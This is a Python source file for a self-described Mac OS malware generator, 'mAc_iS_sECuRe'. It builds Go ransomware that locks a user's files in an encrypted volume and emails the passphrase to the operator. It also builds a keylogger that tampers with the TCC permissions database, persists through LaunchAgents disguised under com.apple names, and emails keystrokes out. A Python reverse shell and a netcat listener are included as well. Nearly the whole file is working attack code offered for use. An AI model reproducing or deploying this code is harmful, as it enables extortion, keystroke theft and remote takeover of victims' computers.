from colorama import Fore, Style
import platform
import os

def infos():
    print("\nPython tool to generate Mac Os malware.\nDeveloped by @thedevilroot | @luke_sh \nLast update: 18/10/2020\n[!] I am not responsible for any of your actions.\nEnjoy!\n")
    inputline()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    inputline()

def help():
    print("\nList of commands for mAc_iS_sECuRe:")
    print("\nRansomware : generates a ransomware working for all mac os versions")
    print("Spy : generates a spyware for mac")
    print("Keylog: generates a keylogger for mac")
    print("RevShell : generates an executable which triggers a reverse shell")
    print("Back : generates a backdoor for mac")
    print("Listen : starts listening on a given port")
    print("FakeRans : generates a fake ransomware that in reality is just renaming files, to troll")
    print("info (or -i) : display software infos")
    print("help (or -h) : show this message duh")
    print("clear : clears the screen as it would in an UNIX terminal\n")
    inputline()

donestuff = "\nDone."
idkbuild = "env GOOS=\"darwin\" GOARCH=amd64 go build "
generating = "Generating..."

def Ransomware():
    
    filepath = input(Fore.RED + "(MIS) Input the name of the text file with the content of the message to display upon infection /> " + Style.RESET_ALL)
    email = input(Fore.RED + "(MIS) Input the mail where you want to receive the key to (must be @gmail) /> " + Style.RESET_ALL)
    password = input(Fore.RED + "(MIS) Input the password for that email account (it sends the key to hitself)/> " + Style.RESET_ALL)
    volumename = input(Fore.RED + "(MIS) Input the name you want for the new encrypted drive on the victim /> " + Style.RESET_ALL)
    dirtoenc = input(Fore.RED + "(MIS) Input the target directory (~/* for the home dir, note: insert in brackets) /> " + Style.RESET_ALL)
    print(Fore.GREEN + generating + Style.RESET_ALL)
    filecon = open(filepath, "r")
    messagecontent = filecon.read().replace("\n", "\\n")
    gofilename = "MacRans.go"
    messagecontent2 = messagecontent.replace("\t", "\\t")
    os.chdir("sks")
    maingo = open(gofilename, "w+")
    maingo.write('''package main

import (
	"io/ioutil"
	"log"
	"net/smtp"
	"fmt"
	"os"
	"os/exec"
	"os/user"

	"github.com/denisbrodbeck/machineid"

	"github.com/reujab/wallpaper"
)

func main() {
	makesh()
	exec.Command("sh /tmp/pssphrs.sh").Run()
	readme()
	changebg()
	sendmail()
}

func makesh() {
	file, err := os.Create("/tmp/pssphrs.sh")
	if err != nil {
		log.Fatal(err)
	}

	defer file.Close()
	hel, err := file.WriteString("#!/bin/bash\\np=$(head -n 1024 /dev/urandom | strings| grep -o \\"[[:alnum:]]\\" | head -n 64 | tr -d \\"\\\\n\\");\\necho \\"$p\\" > /tmp/pssphrs.txt;\\ndiskutil apfs addVolume desk1 APFS ''' + volumename + ''' -passphrase \\"$p\\";\\nrsync -zvh --remove-source-files ''' + dirtoenc + ''' /Volumes/'''+ volumename + ''';\\ndiskutil umount ''' + volumename + ''';")
	if err != nil {
		log.Fatalf("failed to writing file: %s", err)
	}
	fmt.Println("File written!", hel)
}

func sendmail() {
	// Read the password from the saved file
	file, err := os.Open("/tmp/pssphrs.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer func() {
		if err = file.Close(); err != nil {
			log.Fatal(err)
		}
	}()
	b, err := ioutil.ReadAll(file)
	file2 := string(b)

	// Authenticating (empty, email, email password, server)
	auth := smtp.PlainAuth("", "''' + email + '''", "''' + password + '''", "smtp.gmail.com")

	// Some identificators
	machineid, err3 := machineid.ID()
	if err3 != nil {
		log.Fatal(err3)
	}
	user, err4 := user.Current()
	if err4 != nil {
		log.Fatal(err4)
	}
	userandid := user.Username + "/" + machineid

	// Actually sending
	to := []string{"''' + email + '''"}
	msg := []byte("To: ''' + email + '''\\r\\n" +
		"Subject: " + userandid + " \\r\\n" +
		"\\r\\n The passprhase is \\"" + file2 + "\\"\\r\\n")
	err2 := smtp.SendMail("smtp.gmail.com:587", auth, "''' + email + '''", to, msg)
	if err2 != nil {
		log.Fatal(err2)
	}

	// Delete file with password
	os.Remove("/tmp/pssphrs.txt")
}

func readme() {
	// Create readme file on the desktop
	messg := "''' + messagecontent2 + '''" // README message
	message := "echo \\"" + messg + "\\" >"
	filen := "~/Desktop/README.txt"
	exec.Command(message, filen).Run()
}

func changebg() {
	// Change wallpaper to image in url
	wallpaper.SetFromURL("http://feelgrafix.com/data/black-wallpaper/black-wallpaper-6.jpg")
}
    ''')
    maingo.close()
    if (platform.system() == "Linux" or platform.system() == "Darwin"):
        os.system(idkbuild + gofilename)
        os.remove(gofilename)
        os.chdir("..")
        os.system("mv sks/MacRans ./MacRans.app")
        print(Fore.GREEN + donestuff + Style.RESET_ALL)
        inputline()
    elif (platform.system() == "Windows"):
        bugbypas = input(Fore.RED + "(MIS) I noticed you are on windows, there is the risk of a bug occuring do you want to continue? [y/N] /> " + Style.RESET_ALL)
        if (bugbypas == "y" or bugbypas == "Y" or bugbypas == "yes" or bugbypas == "Yes"):
            os.system(idkbuild + gofilename)
            os.remove(gofilename)
            os.chdir("..")
            os.system("move sks\\MacRans .\\MacRans.app")
            print(Fore.GREEN + donestuff + Style.RESET_ALL)
            inputline()
        elif (bugbypas == "n" or bugbypas == "N" or bugbypas == "no" or bugbypas == "No"):
            print(Fore.GREEN + "The bug will get fixed soon, for now build the .go file for yourself for GOOS=\"darwin\"" + Style.RESET_ALL)
            os.chdir("..")
            inputline()

#Need: email, password
def keylogger():
    email = input(Fore.RED + "(MIS) Input the mail where you want to receive the key to (must be @gmail) /> " + Style.RESET_ALL)
    password = input(Fore.RED + "(MIS) Input the password for that email account (it sends the key to hitself)/> " + Style.RESET_ALL)
    print(Fore.GREEN + generating + Style.RESET_ALL)
    os.chdir("sks")
    gofilename = "MacKeylogger.go"
    maingo = open(gofilename, "w+")
    maingo.write('''package main
import (
	"fmt"
	"log"
	"os"
	"os/exec"
)

func main() {
	makesh()
	makereq()
	makepy()
	exec.Command("sh /tmp/pssphrs.sh").Run()
	makeplst()
}

func makesh() {
	file, err := os.Create("/tmp/pssphrs.sh")
	if err != nil {
		log.Fatal(err)
	}

	defer file.Close()
	hel, err := file.WriteString("#!/bin/bash\\nCAN_RUN_KEY=1\\nSHOULD_TRY_PERM=1\\nOS=$(uname)\\nif ! [ $OS == \\"Darwin\\" ]; then\\n\\texit 0\\nfi\\nVERSION=$(sw_vers -productVersion)\\nMINOR=$(echo $VERSION | cut -d. -f2)\\nif [ $MINOR -ge 12 ]; then\\n\\tSIP=$(csrutil status)\\n\\tif [ \\"$SIP\\" == \\"System Integrity Protection status: enabled.\\" ]; then\\n\\t\\texit 0\\n\\tfi\\nelse\\n\\texit 0\\nfi\\nif [ $SHOULD_TRY_PERM == 1 ]; then\\n\\tsudo chmod 664 \\"/Library/Application Support/com.apple.TCC/TCC.db\\" &> /dev/null\\n\\tTRY1=$(sudo sqlite3 \\"/Library/Application Support/com.apple.TCC/TCC.db\\" \\"INSERT or REPLACE INTO access VALUES('kTCCServiceAccessibility','com.apple.Terminal',0,1,1,NULL,NULL);\\" 2>&1)\\n\\tTRY2=$(sudo sqlite3 \\"/Library/Application Support/com.apple.TCC/TCC.db\\" \\"INSERT or REPLACE INTO access VALUES('kTCCServiceAccessibility','com.googlecode.iterm2',0,1,1,NULL,NULL);\\" 2>&1)\\n\\tif [[ $TRY1 == *\\"Error\\"* ]] && [[ $TRY2 == *\\"Error\\"* ]]; then\\n\\t\\texit 0\\n\\tfi\\nfi\\npip install -r /tmp/requirements.txt &> /dev/null\\npython /tmp/comapplepy.py &\\nexit 0")
	if err != nil {
		log.Fatalf("failed to writing file: %s", err)
	}
	fmt.Println("File written!", hel)
}

//py script name: /tmp/comapplepy.py

func makereq() {
	file, err := os.Create("/tmp/requirements.txt")
	if err != nil {
		log.Fatal(err)
	}

	defer file.Close()
	hel, err := file.WriteString("certifi==2018.8.24\\nchardet==3.0.4\\nconfigparser==3.5.0\\nidna==2.7\\npyobjc==4.2.2\\npyobjc-core==4.2.2\\npyobjc-framework-Accounts==4.2.2\\npyobjc-framework-AddressBook==4.2.2\\npyobjc-framework-AppleScriptKit==4.2.2\\npyobjc-framework-AppleScriptObjC==4.2.2\\npyobjc-framework-ApplicationServices==4.2.2\\npyobjc-framework-Automator==4.2.2\\npyobjc-framework-AVFoundation==4.2.2\\npyobjc-framework-AVKit==4.2.2\\npyobjc-framework-BusinessChat==4.2.2\\npyobjc-framework-CalendarStore==4.2.2\\npyobjc-framework-CFNetwork==4.2.2\\npyobjc-framework-CloudKit==4.2.2\\npyobjc-framework-Cocoa==4.2.2\\npyobjc-framework-Collaboration==4.2.2\\npyobjc-framework-ColorSync==4.2.2\\npyobjc-framework-Contacts==4.2.2\\npyobjc-framework-ContactsUI==4.2.2\\npyobjc-framework-CoreBluetooth==4.2.2\\npyobjc-framework-CoreData==4.2.2\\npyobjc-framework-CoreLocation==4.2.2\\npyobjc-framework-CoreML==4.2.2\\npyobjc-framework-CoreServices==4.2.2\\npyobjc-framework-CoreSpotlight==4.2.2\\npyobjc-framework-CoreText==4.2.2\\npyobjc-framework-CoreWLAN==4.2.2\\npyobjc-framework-CryptoTokenKit==4.2.2\\npyobjc-framework-DictionaryServices==4.2.2\\npyobjc-framework-DiskArbitration==4.2.2\\npyobjc-framework-EventKit==4.2.2\\npyobjc-framework-ExceptionHandling==4.2.2\\npyobjc-framework-ExternalAccessory==4.2.2\\npyobjc-framework-FinderSync==4.2.2\\npyobjc-framework-FSEvents==4.2.2\\npyobjc-framework-GameCenter==4.2.2\\npyobjc-framework-GameController==4.2.2\\npyobjc-framework-GameKit==4.2.2\\npyobjc-framework-GameplayKit==4.2.2\\npyobjc-framework-ImageCaptureCore==4.2.2\\npyobjc-framework-IMServicePlugIn==4.2.2\\npyobjc-framework-InputMethodKit==4.2.2\\npyobjc-framework-InstallerPlugins==4.2.2\\npyobjc-framework-InstantMessage==4.2.2\\npyobjc-framework-Intents==4.2.2\\npyobjc-framework-IOSurface==4.2.2\\npyobjc-framework-iTunesLibrary==4.2.2\\npyobjc-framework-LatentSemanticMapping==4.2.2\\npyobjc-framework-LaunchServices==4.2.2\\npyobjc-framework-libdispatch==4.2.2\\npyobjc-framework-LocalAuthentication==4.2.2\\npyobjc-framework-MapKit==4.2.2\\npyobjc-framework-MediaAccessibility==4.2.2\\npyobjc-framework-MediaLibrary==4.2.2\\npyobjc-framework-MediaPlayer==4.2.2\\npyobjc-framework-ModelIO==4.2.2\\npyobjc-framework-MultipeerConnectivity==4.2.2\\npyobjc-framework-NetFS==4.2.2\\npyobjc-framework-NetworkExtension==4.2.2\\npyobjc-framework-NotificationCenter==4.2.2\\npyobjc-framework-OpenDirectory==4.2.2\\npyobjc-framework-Photos==4.2.2\\npyobjc-framework-PhotosUI==4.2.2\\npyobjc-framework-PreferencePanes==4.2.2\\npyobjc-framework-PubSub==4.2.2\\npyobjc-framework-QTKit==4.2.2\\npyobjc-framework-Quartz==4.2.2\\npyobjc-framework-SafariServices==4.2.2\\npyobjc-framework-SceneKit==4.2.2\\npyobjc-framework-ScreenSaver==4.2.2\\npyobjc-framework-ScriptingBridge==4.2.2\\npyobjc-framework-SearchKit==4.2.2\\npyobjc-framework-Security==4.2.2\\npyobjc-framework-SecurityFoundation==4.2.2\\npyobjc-framework-SecurityInterface==4.2.2\\npyobjc-framework-ServiceManagement==4.2.2\\npyobjc-framework-Social==4.2.2\\npyobjc-framework-SpriteKit==4.2.2\\npyobjc-framework-StoreKit==4.2.2\\npyobjc-framework-SyncServices==4.2.2\\npyobjc-framework-SystemConfiguration==4.2.2\\npyobjc-framework-Vision==4.2.2\\npyobjc-framework-WebKit==4.2.2\\nrequests>=2.20.0\\nurllib3==1.23")
	if err != nil {
		log.Fatalf("failed to writing file: %s", err)
	}
	fmt.Println("File written!", hel)
}

func makepy() {
	file, err := os.Create("/tmp/comapplepy.py")
	if err != nil {
		log.Fatal(err)
	}

	defer file.Close()
	hel, err := file.WriteString("#!/usr/bin/env python\\nimport os, sys\\nsys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))\\nfrom ConfigParser import SafeConfigParser\\nfrom AppKit import NSApplication, NSApp\\nfrom Foundation import NSObject\\nfrom Cocoa import NSEvent, NSKeyDownMask\\nfrom PyObjCTools import AppHelper\\nparser = SafeConfigParser()\\ntry:\\n\\tparser.read('.src/p.ini')\\n\\tSEPARATOR = parser.get('p','sep') or ','\\n\\tDIRECTORY = parser.get('p','dir') or '/Library/Caches'\\n\\tFILENAME = parser.get('p','filename') or 'com.apple.pkl'\\n\\tFALLBACK = parser.get('p','fallback') or '/'\\nexcept:\\n\\tSEPARATOR = ','\\n\\tDIRECTORY = '/Library/Caches'\\n\\tFILENAME = 'com.apple.pkl'\\n\\tFALLBACK = '/'\\nclass AppDelegate(NSObject):\\n\\tdef applicationDidFinishLaunching_(self, notification):\\n\\t\\tmask_down = NSKeyDownMask\\n\\t\\tNSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask_down, key_handler)\\nclass Writer:\\n\\tdef __init__(self):\\n\\t\\tself.path = self.create_log()\\n\\t\\tself.leng = 0\\n\\tdef get_target_directory(self):\\n\\t\\ttry:\\n\\t\\t\\tif os.getlogin():\\n\\t\\t\\t\\treturn '/Users/{}{}'.format(os.getlogin(), DIRECTORY)\\n\\t\\t\\treturn FALLBACK\\n\\t\\texcept:\\n\\t\\t\\treturn FALLBACK\\n\\tdef create_log(self):\\n\\t\\tdir = self.get_target_directory()\\n\\t\\tfilepath = os.path.join(dir, FILENAME)\\n\\t\\tf = open(filepath, 'w+')\\n\\t\\tf.close()\\n\\t\\treturn filepath\\n\\tdef write_to_log(self, value_char, value_raw):\\n\\t\\tself.leng += 1\\n\\t\\twith open(self.path, 'a') as f:\\n\\t\\t\\tf.write('{}{}{}'.format(value_char, SEPARATOR, value_raw))\\nw = Writer()\\ndef key_handler(event):\\n\\ttry:\\n\\t\\tcapture_char = event.characters()\\n\\t\\tcapture_raw = event.keyCode()\\n\\t\\tw.write_to_log(capture_char, capture_raw)\\n\\texcept KeyboardInterrupt:\\n\\t\\tAppHelper.stopEventLoop()\\nif __name__ == '__main__':\\n\\tapp = NSApplication.sharedApplication()\\n\\tdelegate = AppDelegate.alloc().init()\\n\\tNSApp().setDelegate_(delegate)\\n\\tAppHelper.runEventLoop()")
	if err != nil {
		log.Fatalf("failed to writing file: %s", err)
	}
	fmt.Println("File written!", hel)
}

// startup folder /Library/LaunchAgents/

func makeplst() {
	file, err := os.Create("/Library/LaunchAgents/com.apple.my-email-task.plist")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	hel, err := file.WriteString("<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n<!DOCTYPE plist PUBLIC \\"-//Apple Computer//DTD PLIST 1.0//EN\\" \\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\\">\\n<plist version=\\"1.0\\">\\n<dict>\\n\\t<key>Label</key>\\n\\t<string>com.apple.my-email-task</string>\\n\\t<key>OnDemand</key>\\n\\t<true/>\\n\\t<key>ProgramArguments</key>\\n\\t<array>\\n\\t\\t<string>/bin/sh</string>\\n\\t\\t<string>/tmp/pssphrs.sh</string>\\n\\t</array>\\n\\t<key>StartInterval</key>\\n\\t<integer>3600</integer>\\n</dict>\\n</plist>")
	if err != nil {
		log.Fatalf("failed to writing file: %s", err)
	}
	fmt.Println("File written!", hel)
}

func makesh2() {
	file, err := os.Create("/tmp/pssphrase.sh")
	if err != nil {
		log.Fatal(err)
	}

	defer file.Close()
	hel, err := file.WriteString("#!/bin/bash\\npython /Library/Caches/fh829hcqn9o.py")
	if err != nil {
		log.Fatalf("failed to writing file: %s", err)
	}
	fmt.Println("File written!", hel)
}

func makepslt2() {
	file, err := os.Create("/Library/LaunchAgents/com.apple.my-email-task-backup.plist")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	hel, err := file.WriteString("<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n<!DOCTYPE plist PUBLIC \\"-//Apple Computer//DTD PLIST 1.0//EN\\" \\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\\">\\n<plist version=\\"1.0\\">\\n<dict>\\n\\t<key>Label</key>\\n\\t<string>com.apple.my-email-task-backup</string>\\n\\t<key>OnDemand</key>\\n\\t<true/>\\n\\t<key>ProgramArguments</key>\\n\\t<array>\\n\\t\\t<string>/bin/sh</string>\\n\\t\\t<string>/Library/Caches/tmp/pssphrase.sh</string>\\n\\t</array>\\n\\t<key>StartInterval</key>\\n\\t<integer>3600</integer>\\n</dict>\\n</plist>")
	if err != nil {
		log.Fatalf("failed to writing file: %s", err)
	}
	fmt.Println("File written!", hel)
}

func makepy2() {
	file, err := os.Create("/Library/Caches/fh829hcqn9o.py")
	if err != nil {
		log.Fatal(err)
	}

	defer file.Close()
	hel, err := file.WriteString("import os\\nSMTP_SERVER = 'smtp.gmail.com'\\nSMTP_PORT = 587\\nSMTP_USERNAME = \'''' + email + '''\'\\nSMTP_PASSWORD = \'''' + password + '''\'\\nSMTP_FROM = \'''' + email + '''\'\\nSMTP_TO = \'''' + email + '''\'\\n\\nTEXT_FILENAME = '/Library/Caches/com.apple.pkl'\\nMESSAGE = \\"\\"\\" You got some key strokes from \\"\\"\\" + os.getlogin()\\n\\n# Now construct the message\\nimport smtplib, email\\nfrom email import encoders\\n\\n\\nmsg = email.MIMEMultipart.MIMEMultipart()\\nbody = email.MIMEText.MIMEText(MESSAGE)\\nattachment = email.MIMEBase.MIMEBase('text', 'plain')\\nattachment.set_payload(open(TEXT_FILENAME).read())\\nattachment.add_header('Content-Disposition', 'attachment', filename=os.path.basename(TEXT_FILENAME))\\nencoders.encode_base64(attachment)\\nmsg.attach(body)\\nmsg.attach(attachment)\\nmsg.add_header('From', SMTP_FROM)\\nmsg.add_header('To', SMTP_TO)\\n\\n# Now send the message\\nmailer = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)\\n# EDIT: mailer is already connected\\n# mailer.connect()\\nmailer.login(SMTP_USERNAME, SMTP_PASSWORD)\\nmailer.sendmail(SMTP_FROM, [SMTP_TO], msg.as_string())\\nmailer.close()")
	if err != nil {
		log.Fatalf("failed to writing file: %s", err)
	}
	fmt.Println("File written!", hel)
}
''')
    maingo.close()
    if (platform.system() == "Linux" or platform.system() == "Darwin"):
        os.system(idkbuild + gofilename)
        os.remove(gofilename)
        os.chdir("..")
        os.system("mv sks/MacKeylogger ./MacKeylog.app")
        print(Fore.GREEN + donestuff + Style.RESET_ALL)
        inputline()
    elif (platform.system() == "Windows"):
        bugbypas = input(Fore.RED + "(MIS) I noticed you are on windows, there is the risk of a bug occuring do you want to continue? [y/N] /> " + Style.RESET_ALL)
        if (bugbypas == "y" or bugbypas == "Y" or bugbypas == "yes" or bugbypas == "Yes"):
            os.system(idkbuild + gofilename)
            os.remove(gofilename)
            os.chdir("..")
            os.system("move sks\\MacKeylogger .\\MacKeylog.app")
            print(Fore.GREEN + donestuff + Style.RESET_ALL)
            inputline()
        elif (bugbypas == "n" or bugbypas == "N" or bugbypas == "no" or bugbypas == "No"):
            print(Fore.GREEN + "The bug will get fixed soon, for now build the .go file for yourself for GOOS=\"darwin\"" + Style.RESET_ALL)
            os.chdir("..")
            inputline()

def revshell():
    yourip = input(Fore.RED + "(MIS) Insert the ip you want to receive the connection to /> " + Style.RESET_ALL)
    yourport = input (Fore.RED + "(MIS) Insert the port you want to receive the connection to /> " + Style.RESET_ALL)
    print(Fore.GREEN + generating + Style.RESET_ALL)
    gofilename = "RevShell.sh"
    maingo = open(gofilename, "w+")
    maingo.write('''#!/bin/bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("''' + yourip + '''",''' + yourport + '''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
''')
    maingo.close()
    print(Fore.GREEN + donestuff + Style.RESET_ALL)
    inputline()

# Mac OS kernel infos https://gist.github.com/alexprivalov/70ada24de8e90e33ec57

def spyware():

	print(Fore.GREEN + generating + Style.RESET_ALL)
	shfilename = "MacSpy.sh"
	mainsh = open(shfilename, "w+")
	mainsh.write('''#!/bin/bash''')
	mainsh.close()
	print(Fore.GREEN + donestuff + Style.RESET_ALL)
	inputline()

#def backdoor():
#    scopeport = input(Fore.RED + "(MIS) On what port do you want to open a backdoor /> " + Style.RESET_ALL)
#    scopassword = input(Fore.RED + "(MIS) Insert the password that will be set to access the backdoor /> ", Style.RESET_ALL)
#    print(Fore.GREEN + generating + Style.RESET_ALL)
#    gofilename = "RevShell.sh"
#    maingo = open(gofilename, "w+")
#    maingo.write('''#!/bin/bash''')

def fakerans():
    filepath = input(Fore.RED + "(MIS) Input the name of the text file with the content of the message to display upon infection /> " + Style.RESET_ALL)
    imageback = input(Fore.RED + "(MIS) Input the link for the image to set as background upon infection /> " + Style.RESET_ALL)
    filext = input(Fore.RED + "(MIS) The files will be renamed, input the extension name for the files (w/o the dot) /> " + Style.RESET_ALL)
    targetpath = input(Fore.RED +  "(MIS) Input the target path /> " + Style.RESET_ALL)
    print(Fore.GREEN + generating + Style.RESET_ALL)
    filecon = open(filepath, "r")
    messagecontent = filecon.read().replace("\n", "\\n")
    messagecontent2 = messagecontent.replace("\t", "\\t")
    os.chdir("sks")
    gofilename = "MacFakeRans.go"
    maingo = open(gofilename, "w+")
    maingo.write('''
package main

import (
	"fmt"
	"log"
	"os/exec"
	"os"
	"path/filepath"
	"time"
	"github.com/reujab/wallpaper"
)

func visit(files *[]string) filepath.WalkFunc {
	return func(path string, info os.FileInfo, err error) error {
		if err != nil {
			log.Fatal(err)
		}
		if info.IsDir() {
			return nil
		}
		ex, err := os.Executable()
		if err != nil {
			panic(err)
		}
		if path == ex {
			return nil
		}
		if filepath.Base(path) == "decrypt.exe" {
			return nil
		}
		if info.Mode().Perm()&(1<<(uint(7))) == 0 {
			return nil
		}

		*files = append(*files, path)
		return nil
	}
}

func Encrypt(pathss string) {
	newname := pathss + ".''' + filext + '''" // extension
	os.Rename(pathss, newname)
}

/*
func removeBoring() {
	homee, _ := os.UserHomeDir()
	appdata := homee + "\\\\AppData\\\\Local"
	os.RemoveAll(appdata)
}*/

func main() {
	var files []string
	var counter int = 1
	var home string
	fmt.Println("Doing a little bit of cleaning first to make the process faster.....\\n")
	fmt.Printf("Starting in: ")
	fmt.Printf("\\n3")
	time.Sleep(1 * time.Second)
	fmt.Printf("\\n2")
	time.Sleep(1 * time.Second)
	fmt.Printf("\\n1\\n")
	time.Sleep(1 * time.Second)
	home = "''' + targetpath + '''"
	err := filepath.Walk(home, visit(&files))
	if err != nil {
		panic(err)
	}
	for _, file := range files {
		fmt.Printf("\\r\\nEncrypting %d/%d: %s", counter, len(files), file)
		Encrypt(file)
		counter++
	}
	fmt.Println("\\n\\n-----------------------------------------")
	fmt.Println("\\nALL THE FILES WERE ECRYPTED!")
	fmt.Println("\\n\\n-----------------------------------------")
	time.Sleep(4 * time.Second)
	readme()
	changebg()
	//reverse()
}

func changebg() {
	// Change wallpaper to image in url
	wallpaper.SetFromURL("''' + imageback + '''")
}

func readme() {
	// Create readme file on the desktop
	messg := "''' + messagecontent2 + '''" // README message
	message := "echo \\"" + messg + "\\" >"
	filen := "~/Desktop/README.txt"
	exec.Command(message, filen).Run()
}

/*
func Decrypt(pathss string) {
	newname := strings.Trim(pathss, ".ahahah")
	os.Rename(pathss, newname)
}

func reverse() {
	var files []string
	var counter int = 1
	var home string
	home, _ = os.UserHomeDir()
	err := filepath.Walk(home, visit(&files))
	if err != nil {
		panic(err)
	}
	for _, file := range files {
		fmt.Printf("\\r\\nDecrypting %d/%d: %s", counter, len(files), file)
		Decrypt(file)
		counter++
	}
}
*/
''')
    maingo.close()
    if (platform.system() == "Linux" or platform.system() == "Darwin"):
        os.system(idkbuild + gofilename)
        os.remove(gofilename)
        os.chdir("..")
        os.system("mv sks/MacFakeRans ./MacFakeRans.app")
        print(Fore.GREEN + donestuff + Style.RESET_ALL)
        inputline()
    elif (platform.system() == "Windows"):
        bugbypas = input(Fore.RED + "(MIS) I noticed you are on windows, there is the risk of a bug occuring do you want to continue? [y/N] /> " + Style.RESET_ALL)
        if (bugbypas == "y" or bugbypas == "Y" or bugbypas == "yes" or bugbypas == "Yes"):
            os.system(idkbuild + gofilename)
            os.remove(gofilename)
            os.chdir("..")
            os.system("move sks\\MacFakeRans .\\MacFakeRans.app")
            print(Fore.GREEN + donestuff + Style.RESET_ALL)
            inputline()
        elif (bugbypas == "n" or bugbypas == "N" or bugbypas == "no" or bugbypas == "No"):
            print(Fore.GREEN + "The bug will get fixed soon, for now build the .go file for yourself for GOOS=\"darwin\"" + Style.RESET_ALL)
            os.chdir("..")
            inputline()

def inputline():
    cmd = input(Fore.RED + "mAc_iS_sECuRe /> " + Style.RESET_ALL)
    if (cmd == "help" or cmd == "-h"):
        help()
    elif (cmd == "info" or cmd == "-i"):
        infos()
    elif (cmd == "clear"):
        clear()
    elif (cmd == "ransomware" or cmd == "Ransomware"):
        Ransomware()
    elif (cmd == "keylog" or cmd == "Keylog"):
        keylogger()
    elif (cmd == "revshell" or cmd == "RevShell" or cmd == "Revshell" or cmd == "revShell"):
        revshell()
    elif (cmd == "listen" or cmd == "Listen"):
        listen()
    elif (cmd == "fakerans" or cmd == "FakeRans" or cmd == "Fakerans"):
        fakerans()

def listen():
	ipporta = input(Fore.RED + "(MIS) Insert the port you want to listen on /> " + Style.RESET_ALL)
	os.system("nc -lvnp " + ipporta)
	inputline()

def main():
    infos()
    inputline()

main()
